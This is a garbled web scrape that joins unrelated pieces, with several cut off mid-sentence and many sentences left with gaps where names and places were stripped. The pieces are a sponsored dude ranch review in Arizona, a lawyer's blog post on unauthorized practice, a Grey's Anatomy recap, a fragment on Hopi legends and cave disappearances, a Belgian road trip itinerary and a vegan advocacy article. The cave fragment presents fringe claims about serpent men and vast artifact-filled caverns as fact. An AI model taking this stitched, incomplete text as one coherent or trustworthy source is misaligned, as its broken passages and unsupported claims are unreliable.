Maxwell&#x2019;s house&#xa0;in Cimarron.    <div>     <strong>PHOTOGRAPHS AND LETTERS OF THE GIRARD FAMILY (Of Albuquerque&#x2019;s Girard Avenue) <span>Found!</span></strong>     <div>      Thank you to Nancy Tucker&#x2019;s Postcard Collection for locating this extraordinary documents, a huge box of photos, letters&#xa0;and other stuff, some of it from France.

   <div>   <h2>Travel Tuesday</h2>   <div>    <p>Cowboy cookout</p>   </div>   <p>For our cowboy weekend, Ken and I traveled to s, a 20,000 acre guest ranch on the edge of <strong>Wickenburg, Arizona</strong> less than an hour&#x2019;s drive west from the Phoenix airport.</p>   <div>    <p>The horse corral at Rancho de los Caballeros</p>   </div>   <p>People who know us, know that we are not the typical &#xa0;in-the-saddle-before-breakfast types. We managed to spend from Friday noon until Sunday noon and never get within touching range of a horse! Yep, pardner, this is not your grandpa&#x2019;s dude ranch. &#xa0;The first clue would be the aroma of freshly cut grass that greets you along the entrance road&#x2013;the 18-hole golf course. And except for the time when some dude left the gate to the horse run open and the horses galloped all over the fairways&#x2013;the beautifully maintained greens are for people only.</p>   <div>    <p>Los Cabelleros golf course</p>   </div>   <p>In all honesty, as non-riders, we were in the minority. Most of the guests were there because they love horseback riding vacations. And many have been coming back every year for decades to ride one of the 100 horses available. Trail rides, lessons, and even team roping keep the equine crowd busy.&#xa0;Special attention is paid to little cowpokes and families love to gather around the scrapbooks that go back to the early 1950&#x2032;s and see how their family has grown up since they first came to Los Caballeros. So for the horseless dudes like us&#x2013;what&#x2019;s to do? Well eat, for one thing. &#xa0;Breakfast and lunch are extensive buffets. We picked up our plates and headed poolside in the picture-perfect October sunshine. &#xa0; Surprisingly, the code of the West at this here dude ranch insists on jackets (or Western vests) for men at dinner. A bit of the fifties remains. Fortunately, women are not required to wear skirts and white gloves.</p>   <div>    <p>Sun C brand of Los Caballeros</p>   </div>   <p>The &#xa0;rambling one-story main building includes a living room with a huge copper clad fireplace, the formal dining room for dinner, the less formal buffet area &#xa0;and a lounge area in the back.The public area decor is 1940&#x2032;s Mexican with walls painted in brilliant primary yellows and reds, carved and hand painted beams and window and door frames. More recent Western paintings displayed throughout are for sale, but what I covet is the priceless collection of tinware that creates murals, mirror frames and room dividers. I have always liked the little tinware pieces made into lamps and wall sconces that you can buy in any Mexican crafts store. &#xa0;But the tinware decorating the walls at Los Caballeros is like the difference between high Renaissance and fingerpainting.</p>   <div>    <p>Tin Work</p>   </div>   <p>The hand-crafted Mexican and Western feel continues in the rooms which open onto winding paths through immaculately groomed desert landscape. A set of seven smaller rooms with hand painted furniture date back to 1947 when workmen scooped up mud from the ranch &#xa0;and molded handmade adobe bricks for the walls. Newer and larger rooms envelop the visitor in deeply cushioned pillow top mattresses, cow-hand sized sofas and chairs with leather, <b>iron</b> and wood prevailing. Forget bunk beds and scratchy wool blankets, cowboy.</p>   <div>    <p>Pilllow-top bed with Western symbols</p>   </div>   <p>This is luxury. The suites include a kitchen (without pans and with very few dishes), fireplaces, free Wifi, flat screen TVs, bathrooms big enough to bring in your horse (although I doubt they&#x2019;d appreciate it.) Rooms open on to patios where you can sit and watch the javelinas and coyotes stroll by in the evening.</p>   <div>    <p>Hassayampa Nature Preserve Trail with Dick, the Naturalist</p>   </div>   <p>We took a walk in the nearby with Los Caballeros own Naturalist; and a with Mike, a knowledgeable guide who spent a lifetime riding the range before turning tour guide. Between the two of them, we felt pretty sure we could survive for longer than fifteen minutes in the desert, and developed a new appreciation for plants that we have lived around for a long time.</p>   <div>    <p>Sun peeking through near Vulture Peak</p>   </div>   <p>The jeep ride jounces over old mine roads out toward Vulture Peak, a volcanic plug that dominates the landscape, and the site of mining operations that gave birth to Wickenburg in the first place. And ahhhh, the Spa.</p>   <div>    <p>Spa courtyard</p>   </div>   <p>I opted for the Hohokam Massage, figuring I should take advantage of the essential oils of some of those desert plants. &#xa0;The Spa is the newest addition to the ranch and they have gone all out to make it a first class operation. &#xa0;Natural desert landscaping&#x2013;a surrounding of cholla cactus, saguaros and lacy mesquite trees&#x2013; gives you a strong sense of place. To cap off the experience, Caballeros Spa has created a labyrinth behind the spa. As you thread your way around the desert-stone-marked sprial path with a view of the mountains in the distance, you feel at one with the Southwest.</p>   <div>    <p>Labyrinth behind Spa</p>   </div>   <p>That mellow feeling expanded to the entire universe when we walked a dirt road out to the site for the cowboy cookout. &#xa0;With a blazing fire of mesquite logs, a cowboy playing the guitar (wait&#x2013;don&#x2019;t I recognize our naturalist from the Nature Walk singing as he strums?) and a black bowl of stars overhead, you couldn&#x2019;t ask for anything more. &#xa0;Except maybe another cold beer and another helping of those luscious ribs. Do you think cowboys ever had barbecued portobello mushrooms? Frankly, I don&#x2019;t care. It seems fitting that a cowhand like me, who refuses to saddle up, should have portobello mushrooms for a dinner cookout, and baked Alaska for brunch the next day. Doesn&#x2019;t it?</p>   <p><em>Rancho de los Caballeros hosted our visit, including two nights and 7 meals, my jeep ride and spa treatment. We were in a Maricopa suite, the priciest of the rooms at the ranch, with large separate living room and a small kitchen. &#xa0;We were impressed with the immaculate upkeep inside and out and the enthusiastic young staff . The food was well above average. Guests pay for the luxury. Room rates (including 3 meals) range from $400 to $650 per day for two people depending on room and season. Activities, including riding, are extra. The ranch is open October through May. You can follow them on Facebook and find them on Twitter, where they are @RanchodelosCab.</em></p>   <p> Do you ride horses? Have you ever vacationed at a dude ranch?

   <div>   <p>In the Empire State, we refer to lawyers who are authorized to practice law as &#x201c;admitted.&#x201d;&#xa0; Whenever someone used the word &#x201c;barred,&#x201d; my mind immediately envisions an iron gate making it impossible to get through.&#xa0; As in, <em>the lawyer was barred from any public place where pleasant people congregate</em>.In other locales, the word &#x201c;barred&#x201d; means that a person is admitted to the bar.&#xa0;Weird locales to a New York lawyer&#x2019;s ear.But what makes it even weirder is when the lawyer refers to those locales as the places where they find and represent clients, even though they are neither admitted nor barred.&#xa0; That&#x2019;s because lawyers, whether you like it or not, are only authorized to be lawyers in places where they have been barred. Or admitted, if you come from a place where people don&#x2019;t talk funny.This is a fairly fundamental aspect to being a lawyer.&#xa0; Just as a cop is only a cop in the geographical area of his employment, authorized by law to make split-second decisions that elsewhere would assure him a murder charge, a lawyer can only practice law where the sanctioning authority says he can. Practicing law in places where a lawyer is unauthorized is a pretty clear wrong, much like raiding an escrow account because that new car is calling your name.&#xa0; Even the ABA, in rule 5.5, admits as much, and they are certainly the last carry the torch of arcane ethical rules.One would think that the disciplinary authority of jurisdictions where a person engaged in the unauthorized practice of law would take something so obvious pretty seriously.&#xa0; After all, if they don&#x2019;t keep a lid on who gets to hang around their jurisdiction claiming to be a lawyer, then what&#x2019;s to stop anybody from doing so?&#xa0; And if anybody can do so, then the public would be deceived and led to seek legal advice from people of dubious competence and devoid of ethics, and the bar associations wouldn&#x2019;t get their dues paid. It would be a disaster all around.Which led me to ponder the significance of this&#xa0; . </p>   <blockquote>    She is barred to practice law in New York and New Jersey&#x2013;but she lives in South Dakota with her husband and one year-old daughter. She services clients living everywhere from Bangladesh and Costa Rica to California and Florida.   </blockquote>Nobody is &#x201c;barred&#x201d; in New York and New Jersey, where local custom is to call it &#x201c;admitted,&#x201d; the first give-away that something is amiss.&#xa0; The rules of admission, the lawfulness of practicing law if you will, do not seem to strike home here. To add to the issue, New Jersey has rather stringent physical office requirements.&#xa0;A quick click on the New Jersey lawyer registration records puts this lawyer in Phoenix, Arizona, which isn&#x2019;t too often confused with Fargo. The notion of authorization to practice law being limited by geography is very old school to new lawyers.&#xa0; Even the&#xa0; &#xa0;thinks it&#x2019;s time to scrap it, if only to reduce lawyers fees by making lawyers compete nationwide.&#xa0; I&#x2019;m disinclined to go with the convenient flow on this one, until someone comes up with a way to make lawyers sufficiently competent in the law and procedure of 51 jurisdictions to safeguard clients.&#xa0; Of course, if the lawyer is sufficiently superficial, then the differences between jurisdictions don&#x2019;t really matter that much; they are relatively incompetent in all jurisdictions, making the unauthorized practice of law the least of the problems. The rationale for eschewing such archaic rules as this is two-fold. First, that the internet has changed everything, by making it easy for anyone to promote themselves online to people anywhere and everywhere, and shouldn&#x2019;t a person be entitled to take money from anyone willing to give it? The second is that old lawyers, the ones who think there is some merit in ethical rules for lawyers, tend to hate anything new and anyone who has found a better way.&#xa0; We fear the new, as the young will steal our business by being smarter, cuter, cooler and more cutting edge.&#xa0; Ethics rules exist to keep them down, to oppress them and prevent them from seizing upon new ideas, new technologies that take away our edge of experience and shift the mojo.&#xa0; We must hate them for ruining our perfect lawyer world. It strikes me that while their rationale is silly, as what the post describes as a &#x201c;successful practice&#x201d; wouldn&#x2019;t be sufficient to support my addiction to three regular meals, there is a point to their cutting edge efforts. If it&#x2019;s cool with the disciplinary authorities in New York, New Jersey, South Dakota, California, Florida and Costa Rica (assuming they have anything remotely similar to what we have), then why shouldn&#x2019;t this lawyer be able to engage in the unauthorized practice of law? Either it&#x2019;s a good rule, in which case the sanctioning bodies need to enforce it, or it&#x2019;s not, in which case they ought to cross it off the books.&#xa0; But as long as it remains a basic rule of being a lawyer, some of us will adhere to it because we feel compelled to honor our ethical requirements.&#xa0; So which is it, guys?&#xa0; Am I barred from representing folks any damn place I want or not?&#xa0; If things like the unauthorized practice of law are too old school to bother with, let&#x2019;s clear this up and quell the commotion. Either way, get off your tired old butts and deal with this.   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

   <div>   <div>    <p>photo: abc</p>   </div>   <strong>Grey&#x2019;s Anatomy</strong>   <em>Take It Back</em>   <p>Original Air Date: Feb 27, 2014</p>   <p><strong>Karen Belgrad &#x2013; Managing Editor</strong> <em>karenbelgrad@thetwocentscorp.com</em></p>   <p>When we left off last year, Grey&#x2019;s had many, many loose ends leaving viewers wondering what was coming next. Would April choose Matthew or Avery? Would Alex&#x2019;s father live? What happened to Ross? Were Callie and Arizona and Bailey and Ben over? Would Derek choose the White House over his promise to Meredith? And were Meredith and Cristina finally done fighting?</p>   <p>Well, guess what&#x2026; they managed to answer every single question. While it was a lot of content for an hour of television, it breezed by in a very non-patient heavy hour. This was purely about our doctors tonight, with only a small side of medical mayhem. So let&#x2019;s get to it&#x2026;</p>   <p><strong>The Wedding:</strong> First and foremost, April came running out of the chapel with Avery, leaving Stephanie and Matthew to lick their wounds. She immediately began to panic over her impulsive decision, getting out of the car in the middle of a country road. Derek and Meredith bickered over his looming presidential work, although she seemed to accept it wasn&#x2019;t something he could turn down. Bailey blew up at Ben, feeling as though she was returned to her first marriage, with someone who didn&#x2019;t value surgery. Ben was adamant that he loved surgery, he just loved being with her more. Arizona lashed out at Callie that she didn&#x2019;t want to be fixed and that their old condo wasn&#x2019;t her home anymore. And while Jimmy hovered near death, Alex wanted him arrested or fired, and Ross slept on a bench.</p>   <p><strong>Three weeks later&#x2026;</strong></p>   <p><strong>Ben and Bailey:</strong> Ben&#x2019;s love of surgery was enough to fix all that ailed their relationship. Remember when Heather Brooks died? Well, that left an opening in the surgical resident program, so Ben is officially a second year resident at Grey Sloan Memorial Hospital. He&#x2019;s mercilessly teased by the other residents, but is clearly Richard&#x2019;s student pet. And Bailey is completely sunshine and happy again. Oh, and pizza and hamburgers give Ben heartburn.</p>   <p><strong>Callie and Arizona:</strong> Changing location changes outlooks. The solution to the twosome&#x2019;s problem&#x2026; buy a new house. Granted, it&#x2019;s a murder house, but it&#x2019;s fresh start without memories of hospital beds or being carried into a shower. Callie is still on the fence about their issues, but Arizona, without promising smooth waters, is more relaxed and happy then we have seen her in forever.</p>   <p><strong>Alex:</strong> Jimmy&#x2019;s still hanging on, mostly because Alex promised that his estranged wife Naomi and son Nicky were on their way. What he didn&#x2019;t count on is that his anger towards his father is only matched by Naomi&#x2019;s. She does show up, but it&#x2019;s only because she believe that Jimmy was already dead and she wanted to reclaim a guitar he stole from her. She leaves without seeing him, guitar in hand. Alex, after pummeling Ross, sits by his father&#x2019;s bedside, lies that Naomi and Nicky are still coming, and gives his dad permission to go. Jimmy dies, as a Alex mutters &#x201c;you sonafabitch&#x201d; to himself.</p>   <p><strong>Ross:</strong> Ross is back (and rested), but not by Owen&#x2019;s choice. Owen fought to have him fired, while the board, especially Cristina, fought for a second chance. But while Richard tries to mentor him gently, Owen is blazing mad and challenging the resident at every turn. Ross apologizes to Alex (which is what earned him the beating) and quietly tries to regain his footing in his career. Richard calls out Owen for possibly being angrier that Ross was sleeping with Cristina, rather than his medical mistake.</p>   <p><strong>Meredith/Cristina: </strong>The two are besties again. They operate together, bond, and all is right with the world.</p>   <p><strong>Derek:</strong> Derek spends the hour being vetted by the White House. They raise an eyebrow that he married a former student, are content that Amelia (Private Practice) is still clean, but do find a red flag in his files. It turns out Derek sends $3500 a month to the mother of a Michael Betcher. He confides in Meredith that Michael was a high school classmate that he crosschecked in hockey, leaving him with a brain bleed in a vegetative state. It flies in the face of his telling Bailey a few seasons ago that he was a scrawny band nerd, but I&#x2019;m sure we&#x2019;re not supposed to remember that. Meredith is still angry with him, but unlike irrational Meredith of last fall, she doesn&#x2019;t seem to be unruly, just irritated.</p>   <p><strong>Jo/Alex:</strong> When Naomi was at the hospital, Alex introduces Jo as his fianc&#xe9;, which shocks the resident. It turns out Alex&#x2019;s speech about wanting to be with her forever was his idea of a proposal, which is reminiscent of when he asked Izzie to be exclusive by asking if he could still sleep with nurses. Jo tells him she&#x2019;s not ready for marriage and that he&#x2019;s only pushing for commitment out of grief. </p>   <p><strong>Avery/April/Stephanie:</strong> It comes out via Leah that after all of the wedding shenanigans, that all of our doctors are now alone. Stephanie is avoiding Avery at all costs, while he is longing to apologize. Stephanie has a &#x201c;cat-man&#x201d; patient, who altered his appearance (tattoos, piercings, plastic surgery) at nineteen to look like a feline. He admits that he now barely leaves his house, so Stephanie uses Avery&#x2019;s guilt, telling him that he can&#x2019;t make her feel better, but he can do pro-bono work to fix the patient. Stephanie, still sad, talks to Leah who bemoans the fact that so many attendings (Cristina, Alex, Arizona, Avery) have been involved with residents (Ross, Jo, Leah, Stephanie). She pushes her to do &#x201c;something about it.</p>   <p>Next thing we see is an emergency board meeting to discuss complaints of sexual harassment, quid pro quo harassment, and hostile work environment. At the boards suggestion, they discuss implanting a zero tolerance policy for workplace relationships between superiors and subordinates, current marriages excluded (Ben/Bailey).</p>   <p>Jackson returns home&#x2026; and advises April that their relationship may not be a secret much longer. They embrace and we spy a wedding band on April&#x2019;s telltale finger. Flashing back to the side of the road from the top of the hour, we see them wonder what comes next. Not wanting to go back to dating, they make the impulsive decision to drive thirteen hours to Lake Tahoe to elope.</p>   <p>And&#x2026; exhale! That was a lot of story for sixty minutes!

Hopi legends say that their ancestors once lived underground with a friendly race of &#x201c;ant people&#x201d; [not to be confused with the sinister &#x201c;mantis&#x201d; people described by several abductees], but some of their kind turned to sorcery and made an alliance with lizard or serpent men known as the &#x201c;two hearts&#x201d;, which dwelt in still deeper caverns below. The &#x201c;flood&#x201d; of evil and violence forced the peaceful Hopi&#x2019;s to the surface world. An explorer named G. E. Kincaid claimed to have found &#x201c;one of&#x201d; the ancient caves, in which were reportedly discovered Oriental, Egyptian &amp; Central American type artifacts. Smithsonian archaeologists S. A. Jordan and associates also explored the man-made cavern with hundreds of rooms, enough to hold over 50 thousand people.

Then a gold prospector named Renn vanished and could not be found by police teams who combed the area for weeks. Harry Owens, a station owner from Oakley Creek, disappeared at the mountain while searching for stray cattle, as did his parter George Hawkins who went to search for him after alerting police. Two police trackers entered the caves but only one came out, and he was so shaken by an experience that terrified him so much that he could give no clear account of what happened. One man armed with a revolver and electric torch penetrated the caves, one of which descended and narrowed, and deep within he encountered bats and a sickly, musty stench, then his torch went out. He crawled for 5 hours through stench-filled caverns, encountering deep precipices and black chambers, until he saw a distant light which he climbed towards, until he reached the surface. source: INFO JOURNAL, Vol.4, No.2; WALKABOUT [Sydney, Australia], June 1972; COOKTOWN AUSTRALIA; BLACK MOUNTAIN AUSTRALIA</span>    </div>    <div>     <span><strong>AUSTRALIA, NULLARBOR PLAINS</strong> &#x2013; The Nullarbor cave region of central south Australia has been the center of UFO sightings and also the site of disappearances of cave explorers.

   <div>   <p>In December 2013, we decided with some good friends to go on a road trip in California. I just wanted to share our roadmap from Los Angeles to Los Angeles accross .</p>   <h2>Preparations</h2>   <p>When planning a visit to California, make sure you reserve and schedule the following visits. These attractions are quitly fast filled-up and you don&#x2019;t want to miss anything?</p>   <ol>    <li>Alcatraz Island (National Park), San Francisco.</li>    <li>Hearst Castle, San Simeon.</li>    <li>Helicopter Flight, at the Grand Canyon.</li>   </ol>   <p>Plan to buy an annual pass for the National Parks. You can pick it up at the visitor center of a National Park Visitor Center and it costs approximately 80$. As we didn&#x2019;t want to be strapped to the schedule and wanted to have some flexibility, we decided only to reserve a sleeping spot on some key locations during our journey. However, a tent will be bought.. Just in case! Wondering about the gas price? No need to look further, everything can be found on this . Fyi: 1 gallon = 3,79 liter. Oh yes it is&#x2026; very cheap compared to the Belgian gas prices!</p>   <h2>Saturday August 16th, 2014</h2>   <p>Take-off is scheduled at 10:05 CEST in Brussels Airport. There is no direct-flight, so a little stop is required in Frankfurt. If we don&#x2019;t encounter any problems on the road, we should be arriving around 16:40 PDT. Before going to the hotel, we need to make a little stop to pick-up our car at the car rental service.</p>   <h2>Sunday August 17th, 2014</h2>   <p>After a very long day and probably a too short night of sleep, we are starting our adventure at Los Angeles. Our first day includes a visit to the local supermarket to gather some supplies such as some bottles of water, a flashlight, some toilet paper, an US map, etc. In the afternoon, we&#x2019;ll going to take a bit easy -we&#x2019;ll still be recovering from jetlag I presume- and visit Universal Studio&#x2019;s and perform a little stroll through Hollywood.</p>   <h2>Monday August 18th, 2014</h2>   <p>On the road to Phoenix, we are planning a stop at. First of all, we pass at the visitor center to buy an annual pass for all the National Parks in the States. Once done, we&#x2019;ll get our stuff and start with some hiking in the park. A nice know-it about Joshua Tree National Park is the fact it&#x2019;s pretty much the same size of . In fact it&#x2019;s still approximately 55 square kilometers larger than West-Vlaanderen (3.144 km2). The park is know for his two different parts of dessert (the higher and the lower . The name of the park is derived from . The park includes some hiking trails, camping spots and a guided drive tour which requires an all-terrain car.</p>   <h2>Tuesday August 19th, 2014</h2>   <p>In the morning we will be travelling towards Phoenix with a regular stop to enjoy the view of the landscape. Some research on the internet led us to in the state of Arizona. Shooter&#x2019;s world provides the ability to rent guns on an hourly-basis and test them out on the shooting range. After having some fun at the gun range we will continue our trip in the direction of Flagstaff (Grand Canyon).</p>   <h2>Wednesday August 20th, 2014 &amp; Thursday August 21th, 2014</h2>   <p>Today we&#x2019;ll be visiting one of nature&#x2019;s finest locations: the Grand Canyon. Carved by the Colorado river, the Grand Canyon reaches a total distance of 446 kilometers and attains a depth of 1.800 meters at certain places. The national park exists out-of 3 main locations: , &amp; . As these locations (driving distance between north and south is approximately 344 kilometers) are a bit out of range of eachother, we decided only to visit two of them. A visit to the SkyWalk will be postponed to a later day as an addendum to the Hoover Dam. Please note a visit to Grand Canyon is included in your annual pass, however an additional fee of 15$ per verhicle is in place. Once payed, it can be re-used in a 7-day range for both the North -, as the South rim.</p>   <h2>Friday August 22th, 2014</h2>   <p>We continue our trip towards &#xa0;with a short stop at . They told us there isn&#x2019;t that much to do over there, besides sightseeing at the rim. So basically, today is a day we will spend a lot of our time in the car driving in the direction (480 kilometers) of our next-stop.</p>   <h2>Saturday August 23rd, 2014</h2>   <p>Today is one of my personal favorites of the road trip. The drive through the of so many Western movies: &#x201c;Monument Valley&#x201d;. We will tend to get a sleeping spot over here, as they told us the sunset can be extremely beautiful.</p>   <h2>Sunday August 24th, 2014</h2>   <p>Starting to work our way back down to Las Vegas. Our first stop in this trip is . Depending on the weather, we can take the rest of the day off and spend some time at the . On other option could be to navigate to Antelope Canyon and create another buffer day.</p>   <h2>Monday August 25th, 2014</h2>   <p>Today&#x2019;s visit? and . Antelope Canyon consist out of two smaller canyons marked with a very specific structure and texture. The two canyons are named &#xa0;the Lower &#x2013; and the Upper Antelope Canyon. The park is not managed by the National Park Service, instead it&#x2019;s managed by the . It means you can&#x2019;t use the annual pass and you need to pay something between 30$ to 80$ for a guided tour per person. As a second part, we&#x2019;ll drop by . Also here an additional fee of 25$ needs to be payed. If it seems really interesting, we can opt to do some hiking on our buffer day of the 27th of August.</p>   <h2>Tuesday August 26th, 2014</h2>   <p>Bryce Canyon! Some people say is more impressing than the Grand Canyon. And if you see the pictures about the landscape, the view and the odd structure of the rocks.. I tend to believe they have a good reason. The area was settled by Mormon People and is named after Ebenezer Bryce, who homesteaded here during the 1870ties.</p>   <h2>Wednesday August 27th, 2014</h2>   <p>After strollin&#x2019; 10 days, we opted to plan a buffer day before heading to Las Vegas. Basically, we don&#x2019;t know what we are going to do with this day. There is a rather large chance, it will be a take-it-easy day.. If we wan&#x2019;t we can still visit one of the last parks to do some hiking.</p>   <h2><strong>Thursday August 28th, 2014</strong></h2>   <p>, the city that never sleeps. First up.. Walking The Strip, catch some of the spirit living in the casino&#x2019;s of world&#x2019;s most-known gambling city in the middle of the desert of Nevada!</p>   <h2>Friday August 29th, 2014</h2>   <p>We tend to leave on-time as we have a busy day ahead of us. First stop, the&#xa0;and additionally the Grand Canyon Skywalk. The Hoover Dam has been constructed in 1931-1936 by thousands of blue-colour workers. During the construction, hunderds of workers lost their life. Some people say, we will never know the exact number. The dam has been named after (31st President of the United States). The construction has been completed in the term of (32nd president of the United States).&#xa0;Did you know the rivers originating from the Grand Canyon are the ones filling up the lake which is the border between Nevada and Arizona? Second stop of the day is the Grand Canyon Skywalk which is on approximately 2 hours of driving distance. The skywalk is a construction made of iron and glass that hangs over the rim giving you an .</p>   <h2>Saturday August 30th, 2014</h2>   <p>Next large city on the list: San Francisco! First stop on the route: Death Valley! Located in the Mojave Desert is known by most people for the extreme conditions. Death Valley is the lowest, hottest and driest place in North America. Maximum temperature ever measured is 56.7&#xb0;C. Another reason why people know Death Valley is for his different , and the lack of flora.</p>   <h2>Sunday August 31st, 2014</h2>   <p>And.. again a day we will spend most of our time in the car. Distance to our next stop is approximately 550km and takes about 6 hours. Maybe we should use some of our time remaining from the day, to do some washes in a launderette.</p>   <h2   <div>   <h1>The State of Veganism, 2015</h1>   <p>Here are some&#xa0;up-to-date observations on the current status of the vegan philosophy&#xa0;from various important viewpoints.</p>   <h2>Vegan diets can be healthy or unhealthy</h2>   <p>A vegan diet, like an omnivorous diet, can be unhealthy if little thought is given to its planning. Since the beginnings of veganism in the early 1800s until only recently, vegan diets has received criticism from most nutritional authorities for lacking various nutrients, or proportions of nutrients including protein, calcium, <b>iron</b>, zinc, vitamin B12 and omega-3 fatty acids. In the past several decades&#xa0;many of these claims have been shown false and it has been demonstrated that a strict vegan diet can comfortably fulfill all necessary nutritional requirements of a healthy human. It is now the opinion of every major national and international nutritional association that a well planned vegan diet can be as healthy, or, as many have stated, healthier in some aspects, than omnivorous and ovo-lacto vegetarian diets.</p>   <ol>    <li><strong>American Dietetic Association: </strong>&#x201c;It is the position of the American Dietetic Association that appropriately planned vegetarian diets, including total vegetarian or vegan diets, are healthful, nutritionally adequate, and may provide health benefits in the prevention and treatment of certain diseases. Well-planned vegetarian diets are appropriate for individuals during all stages of the life cycle, including pregnancy, lactation, infancy, childhood, and adolescence, and for athletes.&#x201d; [1]</li>    <li><strong>Dietitian&#x2019;s Association of Australia:</strong> &#x201c;Despite these restrictions [a lack of animal products], with good planning it is still possible to obtain all the nutrients required for good health on a vegan diet.&#x201d; [2]</li>    <li><strong>British Dietitians Association:</strong>&#xa0;&#x201c;Well planned vegetarian [and strict-vegetarian] diets can be nutritious and&#xa0;healthy. They are associated with lower risks of&#xa0;heart disease, high blood pressure, Type 2 diabetes,&#xa0;obesity, certain cancers and lower cholesterol levels.&#xa0;This could be because such diets are lower in&#xa0;saturated fat, contain fewer calories and more fibre&#xa0;and phytonutrients/phytochemicals (these can have&#xa0;protective properties) than non-vegetarian diets.&#x201d; [3]</li>    <li><strong>Dietitians of Canada:</strong>&#xa0;&#x201c;A healthy vegan diet has many health benefits including lower rates of obesity, heart disease, high blood pressure, high blood cholesterol, type 2 diabetes and certain types of cancer.&#x201d; and &#x201c;A healthy vegan diet can meet all your nutrient needs at any stage of life including when you are pregnant, breastfeeding or for older adults. [4]</li>   </ol>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h2>Athletes&#xa0;can excel&#xa0;on a vegan diet</h2>   <p>Despite vegan diets being widely accepted by all major dietitians associations, there is still a distinct hostility towards the vegan diet, particularly with some online bloggers who feel that the validity of their chosen diet is being threatened by research which supports veganism as a healthy diet. Unable to hold their ground against a number of major studies supporting veganism, some bloggers have turned to new claims that &#x2018;optimal nutrition&#x2019; cannot be achieved on a vegan diet. Though we can not, at this stage&#xa0;in our understanding of the human body, know what&#xa0;constitutes an&#xa0;&#x2018;optimal&#x2019; diet for the average human, these examples of arguably optimal humans do cast some doubt on the speculatory claims of these bloggers:</p>   <ul>    <li>:&#xa0;Germany&#x2019;s Strongest Man in 2011 and during 2013 he broke the world record for the most weight ever carried ().</li>    <li>: World champion UFC fighter, 2007</li>    <li>: World champion UFC fighter, 2009</li>    <li>: World-class boxer and&#xa0;winner the US title in 2008, 2010, 2013 and 2014 and the Golden Gloves 2009, 2011 and 2013.</li>    <li>: World-class bodybuilder who is now vegan (and interestingly was Elton John&#x2019;s personal bodyguard for more than a decade).</li>    <li>: Record breaking rock climber,&#xa0;&#xa0;the only woman to have&#xa0;&#xa0;a&#xa0;&#xa0;climb.</li>    <li>: Professional boxer holding several titles and, as of 2014, is&#xa0;Ring Magazine&#x2019;s number 5, Best Pound for Pound boxer in the world.</li>    <li>: One of the worlds most successful ultra-marathon runners. Hold several records and 3 consecutive &#x201c;Male ultra-runner of the year&#x201d; awards.</li>    <li>: A professional boxer holding Cruiserweight and Heavyweight world titles.</li>    <li>: 2009 world champion free-runner (and funnily enough, one of the Death Eaters in the last Harry Potter movie).</li>   </ul>   <dl>    <dd>     Patrik Baboumian breaking the world record for the most weight ever carried (2013)    </dd>   </dl>   <p>Particularly interesting is the <em>proportion</em> of vegan super-athletes. For example, at the time of writing, vegans fighters have won a quarter of the UFC/TUF world championships in the welterweight division in the last 8 years. The proportion of vegan fighters entering these tournaments is <em>significantly lower</em>.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h2>Eating meat and&#xa0;animal products can hurt the environment</h2>   <ol>    <li><strong>Food and Agriculture Organisation of the United Nations:</strong>&#xa0;&#x201c;The livestock sector emerges as one of the top two or three most significant contributors to the most serious environmental problems, at every scale from local to global.&#x201d; and &#x201c;The livestock sector is a major stressor on many ecosystems and on the planet as a whole. Globally it is one of the largest sources of greenhouse gasses and one of the leading causal factors in the loss of biodiversity, while in developed and emerging countries it is perhaps the leading source of water pollution.&#x201d;[5] and &#x201c;As a large user of natural resources and contributor&#xa0;to climate change, the livestock sector&#xa0;needs to address its environmental footprint.&#x201d;[6]</li>    <li><strong>30% of the word&#x2019;s total ice-free land surface</strong> is used to solely to support animals grown for meat, eggs or dairy products [7]. In Australia more than 50% of the natural vegetation has been turned to grazing, primarily for cattle [8]. &#xa0;In Brazil, 70% of all original rain-forest has been destroyed for grazing [7]. These are very significant and statistics.</li>    <li><strong>Australian Bureau of Statistics:</strong>&#xa0;&#x201c;Grazing accounts for just over half of all land use.

Diets high in vegetables, fruits, whole grains and beans can help prevent these diseases and promote health in a variety of ways. [&#x2026;] The majority of the protein foods consumed in the U.S. are meat and animal products, which are often high in saturated fat and cholesterol, as opposed to the more nutrient-dense and health-promoting plant-based options (e.g., beans, peas, lentils, soy products, nuts and seeds).&#x201d; [9]</li>    <li><strong>American Journal of Clinical Nutrition:</strong>&#xa0;&#x201c;a&#xa0;very low meat intake was associated with a significant decrease in risk of death in 4 [of 6] studies,&#x201d; <strong>and</strong> &#x201c;Current prospective cohort data from adults in North America and Europe raise the possibility that a lifestyle pattern that includes a very low meat intake is associated with greater longevity.&#x201d;[10]</li>    <li><strong>Harvard Health Publications:</strong> &#x201c;A meta-analysis of 29 studies of meat consumption and colon cancer concluded that a high consumption of red meat increases risk by 28%, and a high consumption of processed meat increases risk by 20%.&#x201d; [12] <strong>and</strong> &#x201c;It appears &#x2018;healthy meat consumption&#x2019; has become an oxymoron [&#x2026;]&#xa0;People in the study who ate the most red meat tended to die younger, and to die more often from cardiovascular disease and cancer. [&#x2026;] even when the researchers compensated for the effects of unhealthy lifestyle, mortality and meat remained associated.&#x201d; [13]</li>    <li><strong>Physicians Committee for Responsible Medicine:</strong> &#x201c;Two themes consistently emerge from studies of cancer from many sites: vegetables and fruits help to reduce risk, while meat, animal products, and other fatty foods are frequently found to increase risk. [&#x2026;] Not surprisingly, vegetarians are at the lowest risk for cancer and have a significantly reduced risk compared to meat-eaters.&#x201d; [14]</li>   </ol>   <p>&#xa0;</p>   <p>&#xa0;</p>   <h2>Veganism is the kind and morally consistent choice</h2>   <ul>    <li><strong>Cambridge Declaration on Consciousness:</strong> &#x201c;&#x2026; the weight of evidence indicates that humans are not unique in possessing the neurological substrates that generate consciousness.

